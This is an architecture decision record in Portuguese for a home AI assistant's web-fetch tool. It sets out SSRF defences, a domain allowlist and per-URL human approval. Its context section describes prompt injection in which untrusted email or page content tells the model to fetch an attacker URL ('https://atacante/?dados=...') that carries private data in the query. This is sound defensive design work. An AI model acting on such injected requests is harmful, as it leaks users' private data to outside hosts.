# ADR-018 — Leitura de páginas web com proteção de rede e aprovação

- **Status:** accepted
- **Data:** 2026-10-22
- **Referências:** [ADR-003](ADR-003-Seguranca-Tools.md); especificação RF-13 e §14.

## Contexto

A especificação pede integração com a web, com permissões explícitas. Ler uma URL
parece só leitura, mas tem dois riscos próprios:

- **SSRF.** O servidor do NeoSon roda na rede de casa. Uma URL pode apontar para o
  roteador, para serviços locais ou para metadados de nuvem, inclusive por DNS que muda
  entre a checagem e a conexão, ou por redirecionamento.
- **Exfiltração.** Conteúdo não confiável (um e-mail, uma página) pode pedir ao modelo
  que busque `https://atacante/?dados=...`, levando dados privados na URL.

## Decisão

A ferramenta `web_fetch` vem desligada (`NEOSON_WEB_FETCH_ENABLED=false`).

- **Rede.** O nome é resolvido antes da conexão, e todos os endereços precisam ser
  públicos (`is_global`, sem multicast; IPv4 mapeado em IPv6 é conferido como IPv4). A
  requisição vai ao IP validado, com o `Host` original e o nome como SNI, então o TLS
  confere o certificado do nome. Proxies do ambiente são ignorados. Os
  redirecionamentos (até 3) são tratados à mão e validados de novo. URL com
  credenciais, outro esquema ou porta inválida é recusada.
- **Aprovação.** O risco é calculado por chamada (`Tool.risk_for`). URLs de domínios
  listados em `NEOSON_WEB_FETCH_ALLOWED_DOMAINS` (e seus subdomínios) são leitura.
  Qualquer outra URL exige a aprovação concreta do ADR-003: a revisão mostra a URL
  inteira, inclusive a query, antes de qualquer conexão.
- **Conteúdo.** Só HTML, texto, Markdown e JSON, com prazo, limite de bytes lidos e
  limite de caracteres devolvidos. Do HTML saem só os textos visíveis: sem script,
  style, template nem head. O resultado vai marcado como dado não confiável. Erros têm
  mensagem fixa e não repetem a resposta do servidor. URL e conteúdo não vão para logs.
- **Catálogo.** Registrada só quando ligada: desligada, catálogo e `runtime_hash` não
  mudam. Ligada, o hash inclui a versão e a lista de domínios, porque ela muda o risco.
  Skills podem declarar `web_fetch` (`SKILL_TOOL_NAMES`), e a ferramenta só existe na
  execução se estiver ligada.

## Alternativas consideradas

- Leitura livre de qualquer URL: deixa a exfiltração a uma frase de distância.
- Bloquear só por regex de host: não resolve DNS que aponta para a rede interna nem
  DNS rebinding.
- Ferramenta de busca (search) com API externa: exige conta e chave de um fornecedor;
  fica para quando houver essa escolha.

## Consequências

Ler fora da lista pede uma aprovação por URL, o que é mais lento e é intencional. O
primeiro endereço resolvido é o usado; não há fallback entre endereços. Páginas que
dependem de JavaScript ficam com pouco ou nenhum texto. Operação no
[runbook](../runbooks/web-fetch.md).
